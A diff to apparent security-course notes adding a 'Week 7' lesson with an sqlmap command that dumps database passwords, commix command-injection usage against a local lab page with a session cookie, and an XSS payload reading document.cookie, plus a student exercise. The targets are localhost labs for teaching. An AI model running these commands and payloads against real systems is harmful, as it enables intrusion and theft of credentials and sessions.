@@ -1,4 +1,20 @@
 #Week 7
+<br>1 . [Windows Code Injection](http://www.ibtimes.co.uk/all-windows-versions-potentially-exposed-cyberattacks-thanks-new-code-injection-atom-bombing-1588719)
+<br>2 . Last week review:
+```
+python sqlmap.py -u "http://localhost:8765/read.php?id=1" --passwords
+```
+<br>3 . [commix](https://github.com/commixproject/commix)
+```
+git clone https://github.com/commixproject/commix.git commix
+python commix.py --url="http://localhost:8???/vulnerabilities/exec/#" --data="ip=localhost" --cookie="PHPSESSID=???????????????; security=low"
+#XSS Reflected - obtain PHP Session ID:
+<script>alert(document.cookie)</script>
+```
+##Exercise
+Investigate [commix](https://github.com/commixproject/commix) and identify exploits in the URL above. Record you findings in a file named commix.txt.
+
+#Week 7
  <br>1 . [DNS DDOS Attack](http://www.independent.co.uk/life-style/gadgets-and-tech/news/netflix-twitter-internet-down-not-working-broken-paypal-ebay-facebook-instagram-a7374506.html)
 <br>2 . [sqlmap](http://sqlmap.org)
 <br>3 . [sqlmap Tutorial](http://www.binarytides.com/sqlmap-hacking-tutorial/)
